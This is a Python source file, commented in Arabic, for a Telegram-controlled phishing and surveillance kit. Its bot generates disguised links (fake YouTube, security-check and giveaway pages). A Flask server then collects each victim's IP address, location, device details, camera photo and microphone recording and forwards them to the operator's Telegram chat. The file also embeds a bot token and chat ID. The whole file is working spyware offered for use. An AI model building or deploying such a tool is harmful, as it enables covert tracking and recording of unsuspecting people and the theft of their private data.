import base64, threading, telebot
from flask import Flask, request, render_template, jsonify

# --- الإعدادات ---
TOKEN = "8132482891:AAGdfrcN6_2H8uULKFB-ayNTYO9cVHy4AcI"
CHAT_ID = "5831364118"
BASE_URL = "https://9ff4d42e9749da.lhr.life" # تأكد من تحديثه دائماً

bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

# --- واجهة البوت ---
@bot.message_handler(commands=['start'])
def start(message):
    markup = telebot.types.InlineKeyboardMarkup()
    btn = telebot.types.InlineKeyboardButton("🔗 إنشاء رابط تتبع", callback_data="create_link")
    markup.add(btn)
    bot.send_message(message.chat.id, "🌐 **مرحباً بك في لوحة التحكم المتقدمة**\n\nاضغط على الزر أدناه لبدء إنشاء فخ التتبع.", 
                     reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: call.data == "create_link")
def ask_for_url(call):
    msg = bot.send_message(call.message.chat.id, "📩 **أرسل الآن الرابط الحقيقي** (مثلاً رابط يوتيوب) الذي سيتم تحويل الضحية إليه بعد سحب بياناتها:")
    bot.register_next_step_handler(msg, process_url)

def process_url(message):
    target_url = message.text
    if not target_url.startswith("http"):
        bot.reply_to(message, "❌ خطأ: يرجى إرسال رابط صحيح يبدأ بـ http")
        return

    # إنشاء روابط لواجهات مختلفة
    links = (
        f"🎬 **واجهة يوتيوب:**\n`{BASE_URL}/v/youtube?t={target_url}`\n\n"
        f"🔒 **واجهة فحص أمان:**\n`{BASE_URL}/v/security?t={target_url}`\n\n"
        f"🎁 **واجهة مسابقات:**\n`{BASE_URL}/v/gift?t={target_url}`"
    )
    bot.send_message(message.chat.id, f"✅ **تم إنشاء الروابط بنجاح:**\n\n{links}", parse_mode="Markdown")

# --- سيرفر الويب واستقبال البيانات ---
@app.route("/v/<template_name>")
def serve_template(template_name):
    target = request.args.get("t", "https://google.com")
    return render_template("index.html", target=target)

@app.route("/capture", methods=["POST"])
def capture():
    data = request.json
    ip = request.headers.get("X-Forwarded-For", request.remote_addr).split(",")[0]
    
    # إرسال المعلومات النصية (الموقع، الجهاز، الخ)
    info = (f"👤 **ضحية جديدة متصلة!**\n"
            f"🌐 IP: `{ip}`\n"
            f"📍 الموقع: `{data.get('loc', 'غير متاح')}`\n"
            f"📱 الجهاز: `{request.headers.get('User-Agent')}`")
    bot.send_message(CHAT_ID, info, parse_mode="Markdown")

    # إرسال الميديا (صورة، صوت)
    if data.get("photo"):
        send_media(data["photo"], "image", "📸 صورة الكاميرا")
    if data.get("audio"):
        send_media(data["audio"], "audio", "🎙️ تسجيل صوتي")

    return jsonify({"status": "ok"})

def send_media(b64_data, type, caption):
    try:
        content = base64.b64decode(b64_data.split(",")[1])
        filename = "capture.jpg" if type == "image" else "capture.ogg"
        with open(filename, "wb") as f: f.write(content)
        with open(filename, "rb") as f:
            if type == "image": bot.send_photo(CHAT_ID, f, caption=caption)
            else: bot.send_voice(CHAT_ID, f, caption=caption)
    except: pass

if __name__ == "__main__":
    bot.remove_webhook()
    threading.Thread(target=bot.infinity_polling, daemon=True).start()
    app.run(host="0.0.0.0", port=5000)